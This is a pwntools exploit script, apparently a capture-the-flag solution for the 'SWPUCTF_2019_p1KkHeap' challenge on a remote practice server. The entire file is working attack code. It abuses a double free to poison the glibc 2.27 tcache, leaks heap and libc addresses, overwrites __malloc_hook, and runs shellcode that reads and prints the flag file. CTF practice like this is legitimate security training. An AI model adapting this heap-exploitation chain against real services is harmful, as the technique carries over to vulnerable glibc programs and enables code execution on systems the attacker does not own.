from pwn import *

#context.log_level = 'debug'
context.arch = 'amd64'

#p = process('./SWPUCTF_2019_p1KkHeap')
p = remote('node4.buuoj.cn', 27741)
#libc = ELF('libc-2.27.so')
libc = ELF('libc-2.27.buu.so')

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def alloc(size):
    p.sendlineafter(b'Your Choice: ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())

def show(index):
    p.sendlineafter(b'Your Choice: ', b'2')
    p.sendlineafter(b'id: ', str(index).encode())

def edit(index, content):
    p.sendlineafter(b'Your Choice: ', b'3')
    p.sendlineafter(b'id: ', str(index).encode())
    p.sendlineafter(b'content: ', content)

def delete(index):
    p.sendlineafter(b'Your Choice: ', b'4')
    p.sendlineafter(b'id: ', str(index).encode())

alloc(0x80) #0
alloc(0x80) #1

delete(0)
delete(0)

show(0)

p.recvuntil(b'content: ')

tcache = u64(p.recv(6).ljust(8, b'\x00')) - 0x260
success('tcache -> {}'.format(hex(tcache)))

bin_0x100 = tcache + 0xc8

alloc(0x80) #2
edit(2, p64(bin_0x100))
alloc(0x80) #3
alloc(0x80) #4 -> bin_0x100_tcache

delete(2) # to unsorted bin
show(0) #leak libc

libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
success('libc_base -> {}'.format(hex(libc_base)))

malloc_hook = libc_base + libc.sym['__malloc_hook']

edit(4, p64(0x66660000))
alloc(0x100) #5 shellcode
edit(4, p64(malloc_hook))
alloc(0x100) #6 malloc_hook

shellcode = shellcraft.open('flag')
shellcode += shellcraft.read('rax', tcache + 0x260, 0x40)
shellcode += shellcraft.write(1, tcache + 0x260, 0x40)

shellcode = asm(shellcode, os = 'linux')

edit(5, shellcode)
edit(6, p64(0x66660000))

alloc(0x20)

print(p.recv())